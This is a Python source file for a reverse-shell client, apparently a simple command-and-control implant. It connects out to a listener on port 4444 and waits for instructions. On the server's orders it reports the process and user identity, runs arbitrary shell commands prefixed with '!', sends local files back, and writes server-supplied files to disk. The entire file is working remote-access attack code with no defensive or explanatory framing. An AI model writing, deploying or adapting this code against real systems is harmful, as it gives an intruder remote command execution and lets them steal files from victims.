import socket
import os

IP = "127.0.0.1"
PORT = 4444
SIZE = 2048
FORMAT = "utf-8"


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((IP, PORT))
    print(f"CONNECTED: client connect to server at {IP}:{PORT}")

    connected = True
    while connected:
        msg = " "
        msg = client.recv(2048).decode("Utf-8")
        if "kill" in msg:
            msg = "close"
            client.send(msg.encode(FORMAT))
            connected = False
        elif "whoami" in msg:
            pid = os.getpid()
            uid = os.getuid()
            user = os.popen("whoami").read().strip("\n")
            to_send = f"[PID:{pid},UID:{uid},USER:{user}]"
            client.send(to_send.encode(FORMAT))
            msg = " "
        elif "upload" in msg:
            filename = msg[7:]
            print(f"client recieved filename: {filename}")
            with open(filename, "w") as f:
                print(f"file {filename} now open")
                # should be a 25Mb upload limit
                # bin_file = client.recv(26843545600).decode("Utf-8")
                print("will now recieve file")
                bin_file = client.recv(2048).decode("Utf-8")
                print("file recieved!")
                print(f"contents of bin_file: {bin_file}")
                f.write(bin_file)
                f.close()
        elif "download" in msg:
            filename = msg[9:].split(" ")[0]
            filename = f"./{filename}"
            if "./ved" in filename:
                msg = " "
                continue
            print(f"attempting to open: {filename}")
            try:
                with open(filename, "r") as f:
                    file = f.read().encode("utf-8")
                    client.send(file)
                    f.close()
                    print("client sent file")
                    msg = " "
            except:
                print("couldn't send file")

        elif msg == " ":
            continue
        elif msg[0] == "!":
            cmd = msg.strip("!")
            output = os.popen(cmd).read().strip("\n")
            to_send = f"[CMD:{cmd},OUTPUT:{output}]"
            client.send(to_send.encode(FORMAT))
        else:
            print(f"Server Sent: {msg}")
            continue
            # msg = " "
        # except OSError as oerr:
        #    print("couldn't recieve from server.")
        #    print("Will now close connection")
        #    connected = False

    client.close()

if __name__ == "__main__":
    main()
